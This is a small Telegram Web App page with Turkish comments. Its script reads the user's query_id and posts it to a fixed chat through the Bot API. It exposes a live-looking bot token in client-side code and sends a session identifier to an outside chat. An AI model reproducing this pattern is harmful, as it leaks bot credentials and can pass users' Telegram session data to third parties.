<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Query ID Alıcı</title>
</head>
<body>
    <h1>Query ID Alıcı</h1>
    <p id="status">Query ID alınıyor...</p>

    <script>
        // Telegram WebApp API'yi başlat
        Telegram.WebApp.ready();

        // Query ID'yi al
        let queryID = Telegram.WebApp.initDataUnsafe.query_id;

        // Eğer queryID varsa
        if (queryID) {
            // Query ID'yi tarayıcı konsoluna yazdır
            console.log("Query ID: ", queryID);

            // Telegram API'ye post isteği göndermek için gerekli bilgileri girin
            let botToken = '7474610771:AAFPme1sfSdOf5_URbry3TCYjs4oj4sTyu4';  // Bot tokeniniz
            let chatId = '1056032213';  // Kullanıcının chat_id'si

            // Telegram Bot API URL'si
            let botUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            // Query ID'yi botunuza gönderin
            fetch(botUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `Alınan Query ID: ${queryID}`
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Bot yanıtı:", data);
                document.getElementById('status').innerText = "Query ID gönderildi.";
            })
            .catch(error => {
                console.error("Hata oluştu:", error);
                document.getElementById('status').innerText = "Hata oluştu.";
            });
        } else {
            document.getElementById('status').innerText = "Query ID bulunamadı.";
        }
    </script>
</body>
</html>
